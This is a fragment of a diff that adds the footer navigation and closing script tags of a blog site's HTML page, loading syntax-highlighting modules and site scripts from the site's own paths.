+      <div class="footer-left">
+        <a href="/axiom-blog-site/" class="footer-brand">Axiom</a>
+      </div>
+      <nav class="footer-nav">
+        <a href="/axiom-blog-site/about" class="footer-link">About</a>
+        <a href="/axiom-blog-site/tags" class="footer-link">Tags</a>
+        <a href="/axiom-blog-site/privacy" class="footer-link">Privacy</a>
+        <a href="/axiom-blog-site/feed.xml" class="footer-link">RSS</a>
+      </nav>
+    </div>
+  </footer>
+
+  <script src="/axiom-blog-site/static/js/highlight.min.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/hljs-powershell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-x86asm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dos.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-http.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nginx.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-apache.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dockerfile.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-armasm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-awk.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-cmake.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-coffeescript.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dart.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-elixir.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-erlang.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fortran.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fsharp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-gradle.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-groovy.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-haskell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-kotlin.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-latex.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-lisp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nix.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-ocaml.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-pgsql.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-protobuf.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-scala.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-vim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/search.js?v=1"></script>
+  <script src="/axiom-blog-site/static/js/animations.js?v=3"></script>
+  
+  <script src="/axiom-blog-site/static/js/crypto.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/app.js?v=3"></script>
+  <script src="/axiom-blog-site/static/js/toc.js?v=7"></script>
+  <script src="/axiom-blog-site/static/js/post.js?v=4"></script>
+
+</body>
+</html>
